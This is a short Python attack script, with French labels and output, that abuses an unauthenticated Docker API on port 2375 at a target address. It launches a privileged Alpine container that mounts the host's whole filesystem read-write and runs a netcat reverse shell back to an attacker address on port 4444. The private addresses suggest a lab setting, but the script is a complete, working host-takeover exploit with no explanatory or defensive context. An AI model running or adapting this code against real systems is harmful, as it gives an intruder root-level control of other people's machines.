import docker

IP_CIBLE = '192.168.1.81'
IP_ATTAQUANT = '192.168.1.79'

client = docker.DockerClient(base_url=f'http://{IP_CIBLE}:2375/')

print("[*] Connexion à l'API Docker...")
print(f"[+] Version Docker: {client.version()['Version']}")

print("[*] Création d'un container privilégié...")
container = client.containers.run(
    'alpine:latest',
    f'sh -c "nc {IP_ATTAQUANT} 4444 -e /bin/sh"',
    detach=True,
    remove=True,
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True
)

print(f"[+] Container créé: {container.id}")
print(f"[*] Reverse shell sur {IP_ATTAQUANT}:4444")
